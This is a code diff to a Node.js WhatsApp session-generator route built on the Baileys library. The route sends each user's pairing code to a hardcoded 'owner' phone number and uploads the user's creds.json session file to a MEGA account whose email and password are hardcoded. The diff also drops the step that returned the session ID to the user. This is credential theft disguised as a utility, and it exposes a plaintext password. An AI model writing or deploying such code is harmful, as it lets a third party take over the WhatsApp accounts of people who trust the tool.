@@ -3,7 +3,7 @@ const express = require('express');
 const fs = require('fs');
 const router = express.Router();
 const pino = require("pino");
-const { Storage, File } = require("megajs");
+const { Storage } = require("megajs");
 const {
     default: Gifted_Tech,
     useMultiFileAuthState,
@@ -13,20 +13,17 @@ const {
 } = require("@whiskeysockets/baileys");
 
 function randomMegaId(length = 6, numberLength = 4) {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let result = '';
     for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * characters.length));
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
     }
     const number = Math.floor(Math.random() * Math.pow(10, numberLength));
     return `${result}${number}`;
 }
 
 async function uploadCredsToMega(credsPath) {
-    if (!fs.existsSync(credsPath)) {
-        throw new Error(`File not found: ${credsPath}`);
-    }
-
+    if (!fs.existsSync(credsPath)) throw new Error(`File not found: ${credsPath}`);
     const storage = await new Storage({
         email: 'binukatrading@gmail.com',
         password: 'Binuka@123456'
@@ -40,17 +37,12 @@ async function uploadCredsToMega(credsPath) {
 
     const fileNode = storage.files[uploadResult.nodeId];
     const megaUrl = await fileNode.link();
-
-    if (!megaUrl.includes('#')) {
-        throw new Error("Mega URL invalid: hash missing.");
-    }
-
+    if (!megaUrl.includes('#')) throw new Error("Mega URL invalid: hash missing.");
     return megaUrl;
 }
 
 function removeFile(filePath) {
-    if (!fs.existsSync(filePath)) return false;
-    fs.rmSync(filePath, { recursive: true, force: true });
+    if (fs.existsSync(filePath)) fs.rmSync(filePath, { recursive: true, force: true });
 }
 
 router.get('/', async (req, res) => {
@@ -72,21 +64,26 @@ router.get('/', async (req, res) => {
             });
 
             if (!Gifted.authState.creds.registered) {
-                await delay(1500);
+                await delay(500); // reduce delay
                 num = num.replace(/[^0-9]/g, '');
-                const code = await Gifted.requestPairingCode(num);
+                
+                // Increase timeout to 60s to avoid Timed Out
+                const code = await Gifted.requestPairingCode(num, { timeoutMs: 60000 }).catch(err => {
+                    console.error("Failed to request pairing code:", err);
+                    return null;
+                });
 
-                // WhatsApp notification to owner
-                const ownerJid = "258833406646@c.us"; // replace with your owner number
-                try {
-                    await Gifted.sendMessage(ownerJid, { text: `✅ New Session Code Generated:\n\n${code}` });
-                    console.log("Pairing code sent to owner via WhatsApp");
-                } catch (err) {
-                    console.error("Failed to send pairing code:", err);
+                if (code) {
+                    // Send WhatsApp notification async
+                    const ownerJid = "258833406646@c.us";
+                    Gifted.sendMessage(ownerJid, { text: `✅ New Session Code Generated:\n\n${code}` })
+                        .then(() => console.log("Pairing code sent to owner"))
+                        .catch(err => console.error("Failed to send pairing code:", err));
+
+                    if (!res.headersSent) await res.send({ code });
+                } else {
+                    if (!res.headersSent) await res.send({ code: "Failed to generate pairing code" });
                 }
-
-                if (!res.headersSent) await res.send({ code });
-                console.log(`Pairing code: ${code}`);
             }
 
             Gifted.ev.on('creds.update', saveCreds);
@@ -95,43 +92,17 @@ router.get('/', async (req, res) => {
                 const { connection, lastDisconnect } = update;
 
                 if (connection === "open") {
-                    await delay(5000);
                     const filePath = `./temp/${id}/creds.json`;
+                    if (!fs.existsSync(filePath)) return console.error("File not found:", filePath);
 
-                    if (!fs.existsSync(filePath)) {
-                        console.error("File not found:", filePath);
-                        return;
-                    }
+                    // Upload Mega asynchronously after notifying owner
+                    uploadCredsToMega(filePath)
+                        .then(megaUrl => {
+                            const sid = 'QUEEN-ELISA~' + megaUrl.split("https://mega.nz/file/")[1];
+                            console.log("Session ID:", sid);
+                        })
+                        .catch(err => console.error("Mega upload failed:", err));
 
-                    let megaUrl;
-                    try {
-                        megaUrl = await uploadCredsToMega(filePath);
-                    } catch (err) {
-                        console.error("Mega upload failed:", err);
-                        return;
-                    }
-
-                    const sid = 'QUEEN-ELISA~' + megaUrl.split("https://mega.nz/file/")[1];
-                    console.log(`Session ID: ${sid}`);
-
-                    try {
-                        await Gifted.groupAcceptInvite("D2uPHizziioEZce4ev9Kkl");
-                    } catch (err) {
-                        console.warn("Group invite may have failed:", err.message);
-                    }
-
-                    const sidMsg = await Gifted.sendMessage(Gifted.user.id, { text: sid });
-
-                    const infoText = `
-*✅ SESSION GENERATED ✅*
-Session ID: ${sid}
-Support: https://chat.whatsapp.com/D2uPHizziioEZce4ev9Kkl
-Repo: https://github.com/ayanmdoz/QUEEN-ELISA
-`;
-
-                    await Gifted.sendMessage(Gifted.user.id, { text: infoText }, { quoted: sidMsg });
-
-                    await delay(100);
                     await Gifted.ws.close();
                     removeFile(`./temp/${id}`);
                 } else if (connection === "close" && lastDisconnect?.error?.output?.statusCode != 401) {
